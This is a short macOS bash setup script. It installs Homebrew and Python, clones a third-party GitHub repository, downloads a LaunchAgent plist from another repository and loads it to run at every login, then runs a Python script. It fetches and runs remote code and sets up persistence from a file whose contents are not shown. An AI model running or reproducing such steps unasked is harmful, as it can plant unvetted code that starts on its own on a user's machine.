#!/bin/bash

set -e  # Exit immediately if a command exits with a non-zero status

cd /Users/Shared/system532

# Check if Homebrew is installed; if not, install it using the official script
if ! command -v brew >/dev/null 2>&1; then
  echo "Installing Homebrew..."
  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
  # Add Homebrew to PATH for this script (Apple Silicon or Intel)
  if [ -d "/opt/homebrew/bin" ]; then
    export PATH="/opt/homebrew/bin:$PATH"
  elif [ -d "/usr/local/bin" ]; then
    export PATH="/usr/local/bin:$PATH"
  fi
else
  echo "Homebrew already installed."
fi

brew --version

# Install Python (if not already installed)
if ! command -v python3 >/dev/null 2>&1; then
  brew install python
fi

python3 --version
pip3 --version

# Clone the stringCup repository if not already present
if [ ! -d "stringCup" ]; then
  git clone https://github.com/BigJ1m/stringCup.git
fi

# Download the LaunchAgent plist to the correct directory
mkdir -p ~/Library/LaunchAgents
curl -o ~/Library/LaunchAgents/com.example.system532.plist \
  https://raw.githubusercontent.com/BigJ1m/532Agent/main/com.example.system532.plist

# Load the LaunchAgent (will start at login)
launchctl unload ~/Library/LaunchAgents/com.example.system532.plist 2>/dev/null || true
launchctl load ~/Library/LaunchAgents/com.example.system532.plist

# Run your Python script
python3 stringCup/cup.py
